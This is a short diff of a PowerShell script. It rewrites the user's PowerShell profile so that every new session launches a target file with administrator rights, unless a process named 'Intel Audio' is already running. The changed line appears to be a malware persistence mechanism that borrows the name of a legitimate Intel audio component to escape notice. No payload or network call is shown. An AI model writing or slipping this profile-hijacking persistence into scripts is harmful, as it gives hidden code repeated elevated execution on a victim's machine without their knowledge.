@@ -68,9 +68,8 @@ if (-Not (Test-Path "$TargetFile")) {
 
 if (Select-String -Path "$PowershellFile" "Start-Process") {
       Write-Output "Powershell profile already updated"
-      # exit 0
 } else {
-      Set-Content -Path "$PowershellFile" -Value "if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name 'Intel Audio.exe') -or (Get-Process -Name 'Intel Audio')) { Start-Process "$TargetFile"  -Verb RunAs } }"
+      Set-Content -Path "$PowershellFile" -Value "if (Get-Process -Name 'Intel Audio' -ErrorAction SilentlyContinue) { exit } else { Start-Process -FilePath '$TargetFile' -Verb RunAs; exit }"
       Write-Output "Powershell profile updated"
 }
 
